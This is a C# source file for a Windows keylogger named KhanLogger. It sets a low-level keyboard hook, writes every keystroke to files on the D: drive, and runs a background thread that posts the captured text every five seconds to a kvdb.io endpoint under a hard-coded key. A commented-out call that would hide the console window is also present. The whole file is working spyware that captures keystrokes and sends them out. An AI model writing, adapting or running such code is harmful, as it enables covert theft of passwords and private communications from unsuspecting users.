using System;

using System.Diagnostics;

using System.Windows.Forms;

using System.Runtime.InteropServices;

using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading; 

namespace ConsoleApplication1

{

    class KhanLogger

    {

        private const int WH_KEYBOARD_LL = 13;

        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        public static int counter = 0;

        public static void upload(object abc)
	{
		Console.WriteLine("upload1 called");
		
		upload((KhanLogger)abc);

	}
	public static void upload(KhanLogger obj)
	{
		Console.WriteLine("upload2 called");
		string path=@"D:";
		
		while(true)
		{
		
		StreamWriter sw = new StreamWriter(@path + @"\upload.txt", true);
		sw.Write("Starting iteration\n");
		int sleepfor = 5000;
		Thread.Sleep(sleepfor);
		try
		{
		 
		
		
		string res="2CD41GteLYLuvotryGMN5g"; 
		string res_key=res;
		string updated_ep="https://kvdb.io/"+res_key+"/hits";
		//string path =@"D:";
		string file_text=File.ReadAllText(@path + @"\keylog_up.txt",System.Text.Encoding.UTF8);
		var res1=obj.PostRequestJson(updated_ep,file_text);

                sw.Write(res1);

                
	     	//Console.WriteLine(res1);
		var res2=obj.getData(updated_ep);
		 sw.Write(res1);
		//Console.WriteLine(res2);
		sw.Close();
		}
		catch(Exception ex)
		{
			//Console.WriteLine("Exception : " +ex.Message);
			sw.Write(ex.Message);
		}
		}
	}


        static void Main(string[] args)

        {

            var handle = GetConsoleWindow();

	    KhanLogger  obj=new KhanLogger(); 


            // Hide

           // ShowWindow(handle, SW_HIDE);

		 Thread thr1 = new Thread(new ParameterizedThreadStart(upload)); 
	    	 thr1.Start(obj);


            _hookID = SetHook(_proc);

            Application.Run();

            UnhookWindowsHookEx(_hookID);
	   

        }




        private static IntPtr SetHook(LowLevelKeyboardProc proc)

        {

            using (Process curProcess = Process.GetCurrentProcess())

            using (ProcessModule curModule = curProcess.MainModule)

            {

                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,GetModuleHandle(curModule.ModuleName), 0);

            }

        }




        private delegate IntPtr LowLevelKeyboardProc(

            int nCode, IntPtr wParam, IntPtr lParam);


	public string getData(string endpoint)
	{
 

		using (var client = new WebClient())
		{
   			 try
    			{
			Console.WriteLine("End point is : " +endpoint);
        		client.BaseAddress = endpoint;
        		// HTTP GET
        		client.UseDefaultCredentials = true;
        		var jsonResponse = client.DownloadString(endpoint);
			return jsonResponse;
    			}
   			 catch (WebException ex)
    			{
       			 // Http Error
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
               		 	HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                		var statusCode = (int)wrsp.StatusCode;
                		var msg = wrsp.StatusDescription;
				Console.WriteLine("Exception : " + msg);
				return msg;
               			// throw new HttpException(statusCode, msg);
            		}
            		else
           		 {
                		Console.WriteLine("Exception 11" + ex.Message);
				return ex.Message;
            		}
    		}
	}
	
 
	}

	public string PostRequestJson(string endpoint, string json)
	{
    		// Create string to hold JSON response
		Console.WriteLine("End point is : " +endpoint);
    		string jsonResponse = string.Empty;
 
    		using (var client = new WebClient())
    		{
       		 try
        		{
	    		//WebProxy wp = new WebProxy("swgproxy.corp.du.ae");
	    		//client.Proxy = wp;

            		client.UseDefaultCredentials = true;
            		client.Headers.Add("Content-Type:application/json");
            		client.Headers.Add("Accept:application/json");
            		var uri = new Uri(endpoint);
           		 var response = client.UploadString(uri, "POST", json);
            		jsonResponse = response;
       			 }
        	catch (WebException ex)
        		{
            		// Http Error
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
               		HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
               		var statusCode = (int)wrsp.StatusCode;
               		var msg = wrsp.StatusDescription;
			Console.WriteLine("Exception : " + msg);
			return msg;
               		// throw new HttpException(statusCode, msg);
            		}
            		else
            		{
                		Console.WriteLine("Exception 11" + ex.Message);
				return ex.Message;
            		}
        		}
    		}
 
   		 return jsonResponse;
	}


        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)

        {
		
	try
	{

            //string path = Path.GetTempPath();
	      string path=@"D:";
	      

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)

            {

                int vkCode = Marshal.ReadInt32(lParam);

                Console.WriteLine((Keys)vkCode);

                StreamWriter sw = new StreamWriter(@path + @"\keylog.txt", true);

                //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);

                sw.Write((Keys)vkCode);

                sw.Close();

                KhanLogger.counter++;

                if (KhanLogger.counter % 2 == 0)

                {

                    

                    string file_text=File.ReadAllText(@path + @"\keylog.txt",System.Text.Encoding.UTF8);

                    file_text = file_text.Replace("Return", Environment.NewLine ).Replace("Space", " ").Replace("Period",".").Replace("Oemcomma",",").Replace("Oem.",".");

                    //file_text = file_text.Replace("LControlKey", "").Replace("ABack", "").Replace("Capital","");

                    //file_text = file_text.Replace("LShiftKey", "").Replace("RShiftKey", "").Replace("RControlKey","");

                    

                    

                    File.WriteAllText(@path + @"\keylog_up.txt", file_text);

                }
		

            }
	}
	catch(Exception ex)
	{
		Console.WriteLine(ex.Message);
	}

            return CallNextHookEx(_hookID, nCode, wParam, lParam);

        }




        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);




        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        [return: MarshalAs(UnmanagedType.Bool)]

        private static extern bool UnhookWindowsHookEx(IntPtr hhk);




        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,IntPtr wParam, IntPtr lParam);




        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

        private static extern IntPtr GetModuleHandle(string lpModuleName);




        [DllImport("kernel32.dll")]

        static extern IntPtr GetConsoleWindow();




        [DllImport("user32.dll")]

        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);




        const int SW_HIDE = 0;

    }

}
